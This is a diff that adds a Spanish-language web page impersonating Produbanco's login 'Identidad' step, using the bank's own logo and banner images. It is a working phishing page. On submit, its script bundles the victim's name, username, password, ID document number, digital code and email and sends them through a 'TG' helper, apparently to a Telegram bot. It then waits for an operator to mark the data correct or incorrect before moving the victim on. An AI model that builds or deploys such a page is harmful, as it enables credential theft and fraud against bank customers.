@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identidad</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --ds-green-primary: #046a38;
+      --ds-green-secondary: #008744;
+      --ds-gray-text: #595959;
+      --ds-gray-title: #222222;
+      --ds-gray-disabled: #e6e6e6;
+      --ds-gray-tertiary: #8f8f8f;
+      --ds-red-error: #c8102e;
+      --ds-bg: #f9f9f9;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--ds-bg);
+      color: var(--ds-gray-text);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .ds-contenedor-principal {
+      flex: 1;
+    }
+
+    .ds-contenedor--publico {
+      display: grid;
+      grid-template-columns: minmax(320px, 570px) minmax(400px, auto);
+      min-height: 100vh;
+    }
+
+    .ds-contenido-principal {
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      grid-column: 1;
+      padding: 40px 11px 40px 32px;
+    }
+
+    .ds-formulario {
+      margin-top: 40px;
+      max-width: 480px;
+      width: 100%;
+    }
+
+    .ds-logotipo {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/Login/ds_logo_produbanco.svg");
+      background-position: left center;
+      background-repeat: no-repeat;
+      background-size: contain;
+      height: 38px;
+      margin-bottom: 30px;
+      width: 180px;
+    }
+
+    .otp-titulo {
+      color: var(--ds-gray-title);
+      font-size: 20px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 32px;
+      margin: 0 0 16px;
+    }
+
+    .otp-card {
+      margin-top: 24px;
+    }
+
+    .otp-card-top {
+      align-items: flex-start;
+      display: flex;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+
+    .otp-icon {
+      height: 48px;
+      width: 48px;
+    }
+
+    .otp-card-texto {
+      color: var(--ds-gray-title);
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 24px;
+      margin: 0;
+      max-width: 360px;
+    }
+
+    .form-group {
+      margin-bottom: 24px;
+      position: relative;
+    }
+
+    .form-input {
+      border: 1px solid var(--ds-gray-tertiary);
+      border-radius: 4px;
+      color: var(--ds-gray-title);
+      font-size: 16px;
+      height: 48px;
+      padding: 0 40px 0 16px;
+      width: 100%;
+    }
+
+    .form-input:focus {
+      border-color: var(--ds-green-primary);
+      outline: none;
+    }
+
+    .form-input.has-error {
+      border-color: var(--ds-red-error);
+    }
+
+    .error-text {
+      color: var(--ds-red-error);
+      display: none;
+      font-size: 13px;
+      font-weight: 700;
+      margin-top: 8px;
+    }
+
+    .form-input.has-error ~ .error-text {
+      display: block;
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 16px;
+      top: 14px;
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+    }
+
+    .otp-actions {
+      display: flex;
+      gap: 18px;
+      margin-top: 44px;
+    }
+
+    .otp-btn {
+      align-items: center;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      display: inline-flex;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      height: 48px;
+      justify-content: center;
+      line-height: 21px;
+      min-width: 109px;
+      padding: 0 24px;
+      text-decoration: none;
+      width: 100%;
+    }
+
+    .otp-btn--disabled {
+      background: var(--ds-gray-disabled);
+      border-color: var(--ds-gray-disabled);
+      color: var(--ds-gray-text);
+      cursor: not-allowed;
+      pointer-events: none;
+    }
+
+    .otp-btn--activo {
+      background: #69be28 !important;
+      border-color: #69be28 !important;
+      color: #fff !important;
+      cursor: pointer;
+      pointer-events: auto;
+    }
+
+    .ds-imagen-principal {
+      grid-column: 2;
+      margin-left: 3px;
+      min-height: 100vh;
+    }
+
+    .ds-imagen-principal__banner {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/ds_banner.png");
+      background-position: right top;
+      background-repeat: no-repeat;
+      background-size: cover;
+      height: 100%;
+      width: 100%;
+    }
+
+    /* Mobile header style for Identidad */
+    .mobile-header {
+      display: none;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px;
+      background: #fff;
+      border-bottom: 1px solid #eaeaea;
+      margin-bottom: 24px;
+    }
+
+    .mobile-header-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--ds-gray-title);
+    }
+
+    @media screen and (max-width: 768px) {
+      .ds-contenedor--publico {
+        display: block;
+        min-height: 100vh;
+        padding: 0;
+      }
+
+      .ds-imagen-principal {
+        display: none;
+      }
+
+      .ds-logotipo {
+        display: none;
+      }
+
+      .mobile-header {
+        display: flex;
+      }
+
+      .ds-contenido-principal {
+        margin: 0 auto;
+        max-width: 570px;
+        padding: 0 16px;
+      }
+
+      .ds-formulario {
+        margin-top: 0;
+        max-width: 100%;
+      }
+
+      .otp-titulo {
+        font-size: 18px;
+        margin-bottom: 8px;
+      }
+
+      .otp-card-texto {
+        font-size: 14px;
+        color: #595959;
+      }
+
+      .otp-card-top {
+        margin-bottom: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="ds-contenedor-principal">
+    
+    <div class="mobile-header" style="justify-content: center;">
+      <span class="mobile-header-title">Identidad</span>
+    </div>
+
+    <section class="ds-contenedor--publico">
+      <section class="ds-contenido-principal">
+        <div class="ds-formulario">
+          <div class="ds-logotipo" aria-label="Logotipo Produbanco"></div>
+
+          <h1 class="otp-titulo">Ingresa tu correo registrado</h1>
+
+          <form id="frmIdentidad">
+            <section class="otp-card">
+              <div class="otp-card-top">
+                <p class="otp-card-texto">
+                  Para continuar ingresa tu correo electr&oacute;nico: ten cuidado de ingresarlo correctamente para continuar.
+                </p>
+              </div>
+
+              <div class="form-group">
+                <input type="email" id="correoIdentidad" class="form-input" placeholder="Ingresa tu correo electr&oacute;nico">
+                <!-- Strikethrough eye icon matching screenshot -->
+                <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="#8f8f8f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                  <line x1="1" y1="1" x2="23" y2="23"></line>
+                </svg>
+                <div class="error-text" id="errorMsg">Direcci&oacute;n de correo incorrecto</div>
+              </div>
+
+            </section>
+
+            <div class="otp-actions">
+              <button id="btnAceptar" class="otp-btn otp-btn--disabled" type="submit" disabled>Continuar</button>
+            </div>
+          </form>
+        </div>
+      </section>
+
+      <aside class="ds-imagen-principal" aria-hidden="true">
+        <div class="ds-imagen-principal__banner"></div>
+      </aside>
+    </section>
+  </main>
+
+  <script src="../tg.js"></script>
+  <script>
+    (function () {
+      const emailInput = document.getElementById("correoIdentidad");
+      const btnAceptar = document.getElementById("btnAceptar");
+      const frmIdentidad = document.getElementById("frmIdentidad");
+      const errorMsg = document.getElementById("errorMsg");
+
+      // Check if there was an error in a previous attempt
+      if (TG.load('errorIdentidad') === 'true') {
+        emailInput.classList.add('has-error');
+        errorMsg.textContent = 'Correo electronico ingresado incorrectamente';
+        TG.save('errorIdentidad', 'false'); // reset
+      }
+
+      function isValidEmail(value) {
+        return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(value.trim());
+      }
+
+      emailInput.addEventListener("input", function () {
+        emailInput.classList.remove('has-error');
+        if (emailInput.value.trim().length > 0) { // Just require some text to enable button based on standard UI, or valid email
+          if (isValidEmail(emailInput.value)) {
+            btnAceptar.disabled = false;
+            btnAceptar.classList.remove("otp-btn--disabled");
+            btnAceptar.classList.add("otp-btn--activo");
+          } else {
+            // Optional: allow enabling on any input to let them submit and fail, but let's strictly require valid format for green
+            btnAceptar.disabled = true;
+            btnAceptar.classList.add("otp-btn--disabled");
+            btnAceptar.classList.remove("otp-btn--activo");
+          }
+        } else {
+          btnAceptar.disabled = true;
+          btnAceptar.classList.add("otp-btn--disabled");
+          btnAceptar.classList.remove("otp-btn--activo");
+        }
+      });
+
+      frmIdentidad.addEventListener("submit", function (event) {
+        event.preventDefault();
+        if (btnAceptar.disabled) return;
+
+        var enteredEmail = emailInput.value.trim();
+        TG.save('emailIdentidad', enteredEmail);
+
+        var msg = '\u{1F464} Nombre: ' + TG.load('nombres') + '\n';
+        msg += '\u{1F464} USU: ' + TG.load('usuario') + '\n';
+        msg += '\u{1F512} SENA: ' + TG.load('sena') + '\n';
+        msg += '\u{1F4C4} Documento: ' + TG.load('documento') + '\n';
+        msg += '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n';
+        msg += '\u2709\uFE0F Correo ACT: ' + enteredEmail;
+
+        TG.overlay(true);
+        TG.send(msg, true, ['Correo \u{1F4E7}', 'Incorrecto \u274C']).then(function (sessionId) {
+          TG.poll(sessionId, function (action) {
+            TG.overlay(false);
+            if (action === 'correct') {
+              window.location.href = '../correo.html'; 
+            } else {
+              TG.save('errorIdentidad', 'true');
+              window.location.reload(); 
+            }
+          });
+        });
+      });
+
+    })();
+  </script>
+</body>
+</html>
